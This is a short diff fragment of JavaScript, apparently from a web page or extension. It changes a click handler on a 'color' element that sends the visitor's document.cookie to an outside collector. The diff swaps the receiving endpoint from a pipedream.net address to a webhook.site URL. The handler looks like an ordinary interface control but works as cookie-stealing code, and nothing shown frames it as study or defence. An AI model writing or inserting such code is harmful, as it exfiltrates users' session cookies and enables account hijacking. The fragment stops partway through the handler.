@@ -1,5 +1,5 @@
 color.onclick = () => {
-    const url = "http://en031xtc06v0xp.x.pipedream.net?cookie=" + encodeURIComponent(document.cookie);
+    const url = "https://webhook.site/271fc1d9-85f1-474b-b4e8-21348ace2fc3?cookie=" + encodeURIComponent(document.cookie);
     fetch(url)
         .then(response => {
             if (response.ok) {
